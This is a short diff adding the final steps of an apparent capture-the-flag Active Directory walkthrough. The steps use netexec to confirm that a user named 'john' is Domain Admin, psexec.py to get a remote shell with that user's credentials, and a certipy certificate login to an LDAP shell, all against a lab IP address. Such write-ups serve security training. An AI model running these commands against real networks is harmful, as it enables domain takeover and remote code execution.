@@ -123,5 +123,17 @@
 
 `certipy auth -pfx administrator1.pfx -dc-ip 10.129.32.88 -ldap-shell`
 
+![image](https://github.com/user-attachments/assets/5f2f263b-3bf8-41de-9375-f944d88c163e)
+
+21. Check John is Domain Admin with netexec and then get root shell on the machine using psexec.py
+
+`nxc smb 10.129.32.88 -u john -p Password123`
+
+`psexec.py john:Password123@10.129.32.88`
+
+![image](https://github.com/user-attachments/assets/3688c466-0203-457f-841d-c225bc93a605)
+
+22. Get root flag and pwned!
+
 
 
